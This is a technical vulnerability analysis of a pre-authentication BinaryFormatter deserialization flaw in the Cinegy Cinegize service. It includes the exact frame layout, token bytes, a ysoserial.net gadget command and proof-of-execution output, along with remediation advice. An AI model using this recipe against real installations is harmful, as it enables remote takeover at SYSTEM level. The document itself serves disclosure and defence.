# Cinegy Cinegize Unauthenticated BinaryFormatter Deserialization RCE — Full Technical Analysis

## Product Background

- **Vendor**: Cinegy GmbH
- **Product**: Cinegy Cinegize (2026-02-05 installer)
- **Category**: broadcast / media workflow automation
- **Service**: `CinegizeService` registered via MSI ServiceInstall as **LocalSystem**, listening on TCP 0.0.0.0:51140 ("remote access for that machine")
- **Protocol**: DotNetty (custom .NET TCP stack); frames are .NET BinaryFormatter-serialized objects

## Stage 0 — Prerequisites / Authentication Boundary

The DotNetty pipeline registers `AuthorizationHandler` **after** the decoder (`MessageReceiver`), meaning client input is **deserialized before authentication**. Even if AuthorizationHandler later enforces a password, the deserialization sink has already fired.

Deployment confirmation:
- `Win32_Service` StartName = LocalSystem, Status = Running
- `Get-NetTCPConnection -LocalPort 51140 -State Listen` = `0.0.0.0:51140`
- `service.xml`: `HostTemporaryPassword` (encrypted, locally readable) + `UpdateToken` — but the password is only checked in the AES branch; the None branch bypasses it

## Stage 1 — Sink Identification

**File**: `Cinegize.Communication.dll` → `BinaryEncoding.Decode` (ilspycmd decompiled)

```csharp
// BinaryEncoding.cs L12-31
public void Decode(IChannelHandlerContext context, IByteBuffer input, List<object> output)
{
    using (MemoryStream stream = new MemoryStream(...))
    {
        new BinaryFormatter().Deserialize(stream);  // ← SINK: no custom binder, no type restrictions
    }
}
```

`BinaryFormatter` with no binder = any type deserializable = ysoserial.net gadgets work. On .NET Framework 4.8.09221, BinaryFormatter is fully functional by default (not disabled as in .NET 5+). `app.config` has no `<NetFx40_LegacySecurityPolicy>` or BinaryFormatter-disable switch.

## Stage 2 — Source Identification

**File**: `Cinegize.Networking.dll` → `MessageReceiver.Decode` (ByteToMessageDecoder, inbound)

```csharp
// MessageReceiver.cs L758-815
protected override void Decode(IChannelHandlerContext context, IByteBuffer input, List<object> output)
{
    MessageHeader messageHeader = default(MessageHeader);
    if (!messageHeader.Read(input)) return;          // read client-controlled 44B header
    if (!messageHeader.IsValid()) { /* close */ return; }
    IByteBuffer payload = input.ReadBytes(messageHeader.PayloadSize);
    if (messageHeader.Encryptor != Encryptors.None)
    {
        // AES branch: decrypt + password check
        Encoding.Decode(context, message, byteBuffer);
        Encryption.Encrypt(context, byteBuffer, output, PasswordManager.CommnonPassword);
    }
    else
    {
        // None branch: direct BinaryFormatter.Deserialize, no decryption, no password
        Encoding.Decode(context, payload, output);   // ← BinaryEncoding.Decode → SINK
    }
}
```

**Source = client-controlled `MessageHeader.Encryptor` field**. The client sets `Encryptor=None` (4B LE = 0) in the frame header, forcing the None branch and triggering `BinaryFormatter.Deserialize` on client raw bytes. The password loop (`PasswordManager`) only matters for the AES branch; the None branch bypasses it completely.

## Stage 3 — Data Flow

DotNetty pipeline order (`NetworkNodeBase.InitChildPipeline` L2170-2197):

```
MessageFramer (LengthFieldBasedFrameDecoder, strips 4B LE length prefix)
  → MessageSender (outbound)
  → MessageReceiver (ByteToMessageDecoder, inbound decoder)   ← deserialization here
    → ConnectionCallbackHandler
    → LicenseHandler
    → AuthorizationHandler                                    ← auth here, but already too late
    → DataCallbackHandler<ClientDescriptor>
    → ...
```

Complete flow:
```
Client TCP frame
  → MessageFramer strips 4B LE length prefix
  → MessageReceiver.Decode reads 44B MessageHeader, validates Token==magic (passes)
    → Encryptor==None branch
      → BinaryEncoding.Decode
        → new BinaryFormatter().Deserialize(payload)   ← SINK before auth
          → ysoserial.net TypeConfuseDelegate gadget fires
            → Process.Start("cmd /c ...")  ← LocalSystem identity
  → (AuthorizationHandler never executes; gadget already fired)
```

## Stage 4 — Injection / Exploitation Construction

### MessageHeader structure (Pack=1, 44 bytes)

| Offset | Field | Size | Value |
|---|---|---|---|
| 0  | MessageSize    | 4 (LE) | 44 + len(payload) = total frame length |
| 4  | PayloadSize    | 4 (LE) | len(payload) |
| 8  | Encryptor      | 4 (LE) | **0 = None** (triggers raw deserialization) |
| 12 | Token          | 16     | magic = 81C17BD9-C56D-48AF-90C1-A35D163269D6 |
| 28 | ExtensionType  | 16     | 0 |

### Token = static public magic (not a secret)

```csharp
// MessageHeader.cs
public static readonly Guid MessageToken = new Guid("81C17BD9-C56D-48AF-90C1-A35D163269D6");
public bool IsValid() => Token == MessageToken;  // protocol marker only, not a key
```

The token is hardcoded in the binary and is a protocol marker, not a credential; the attacker simply includes it. .NET `Guid.ToByteArray()` byte order: Data1(4 LE) + Data2(2 LE) + Data3(2 LE) + Data4(8 BE) = `d9 7b c1 81 6d c5 af 48 90 c1 a3 5d 16 32 69 d6`.

### MessageFramer

```csharp
public class MessageFramer : LengthFieldBasedFrameDecoder {
    public MessageFramer() : base(ByteOrder.LittleEndian, int.MaxValue, 0, 4, -4, 0, failFast: false) { }
}
```

= standard 4-byte little-endian length-prefix framing; `lengthFieldOffset=0`, `lengthFieldLength=4`, `lengthAdjustment=-4`, `initialBytesToStrip=0` → length field = MessageSize = total frame length.

### Gadget generation

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c whoami /all > C:\Windows\Temp\cinegy_rce_marker.txt & echo CINEGY_RCE_SUCCESS > C:\Windows\Temp\cinegy_rce_marker2.txt" \
  -o base64
```

Generates a 2362-byte BinaryFormatter payload. TypeConfuseDelegate depends on System.Configuration.Install.dll / System.Management.dll (GAC_MSIL) + System.Management.Automation.dll (install dir, 360KB) — all available on the target.

### Complete frame

```
[MessageSize(4B LE)=44+2362=2406 = 96 09 00 00]
[PayloadSize(4B LE)=2362 = 3a 09 00 00]
[Encryptor(4B LE)=0 = 00 00 00 00]
[Token(16B)=d9 7b c1 81 6d c5 af 48 90 c1 a3 5d 16 32 69 d6]
[ExtensionType(16B)=0]
[2362B BinaryFormatter gadget]
```

## Stage 5 — Dynamic Verification

### Environment
- Target: Windows Server 2025 Datacenter, CinegizeService PID LocalSystem, 51140 Listen (firewall restricted to loopback in the lab)
- Execution host: same Windows server (51140 limited to localhost, so the exploit must run locally)
- Tools: ysoserial.net v1.36, Python 3.12

### Execution
```bash
python cinegy_exploit.py 127.0.0.1 51140
```

### Script stdout
```
[*] Target 127.0.0.1:51140
[*] Generating TypeConfuseDelegate gadget via ysoserial.net ...
[+] Gadget generated: 2362 bytes
[*] Frame total 2406 bytes (header 44 + gadget 2362)
[+] Connected
[*] Server banner frame length = 531
[*] Sending exploit frame ...
[+] Frame sent
[*] Server response after send (1058 bytes): b'"\x04\x00\x00\xf6\x03\x00\x00\x00\x00\x00\x00\xd9{\xc1\x81m\xc5\xafH\x90\xc1\xa3]\x162i\xd6...'
[*] Done. Check C:\Windows\Temp\cinegy_rce_marker*.txt
```

The server returned a 1058-byte response frame echoing the magic token (`d9 7b c1 81 6d c5 af 48 90 c1 a3 5d 16 32 69 d6`) = deserialization processed the client frame.

### Target-side verification

`C:\Windows\Temp\cinegy_rce_marker.txt` (3305 bytes, `whoami /all` output):
```
User name           SID
=================== ========
nt authority\system S-1-5-18    <- SYSTEM identity

Mandatory Label\System Mandatory Level S-1-16-16384   <- System integrity level

SeTcbPrivilege                  Enabled    <- highest privilege
SeDebugPrivilege               Enabled
SeImpersonatePrivilege         Enabled
SeLoadDriverPrivilege          Enabled
SeBackupPrivilege              Enabled
SeRestorePrivilege             Enabled
SeTakeOwnershipPrivilege       Enabled
... (all system privileges)
```

`C:\Windows\Temp\cinegy_rce_marker2.txt` (21 bytes): `CINEGY_RCE_SUCCESS`

CinegizeService did not crash; PID stayed Running, 51140 stayed Listening = repeatable exploitation.

## Stage 6 — Reachability

- **Network**: after default install, 51140 listens on 0.0.0.0 (vendor firewall rule "Cinegy Cinegize" Inbound Allow wide open). The lab restricted it to 127.0.0.1, but **any remote host is reachable under the default config**
- **Auth**: none required. The decoder runs before AuthorizationHandler
- **License**: trial license auto-obtained, no gate
- **Gadget**: TypeConfuseDelegate assemblies all available in GAC or the install dir

## Stage 7 — Defense in Depth / Remediation

1. **Remove/replace BinaryFormatter**: migrate to DataContractSerializer or protobuf, or explicitly disable + use a custom allowlist binder
2. **Auth before deserialize**: move AuthorizationHandler before the decoder, or validate session/password inside `MessageReceiver.Decode` before deserializing
3. **Encryptor field not trustable**: the client-controlled `Encryptor=None` branch must not deserialize raw bytes; require AES + password check before deserialization
4. **Token is not a key**: MessageToken is a public magic number; introduce per-session key negotiation
5. **Least privilege**: CinegizeService should not run as LocalSystem; use NetworkService/restricted account

## Reproduction

```bash
# (Windows server) generate gadget + send frame
python cinegy_exploit.py 127.0.0.1 51140

# check markers
type C:\Windows\Temp\cinegy_rce_marker.txt   # contains nt authority\system
type C:\Windows\Temp\cinegy_rce_marker2.txt  # CINEGY_RCE_SUCCESS
```

## CWE / CVSS

- CWE-502 (Deserialization of Untrusted Data) — `BinaryFormatter.Deserialize` before auth
- CWE-306 (Missing Authentication) — deserialization precedes AuthorizationHandler
- CWE-78 (OS Command Injection) — gadget `Process.Start`
- **CVSS 3.1**: ≈ 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) — PR:N because no authentication is required
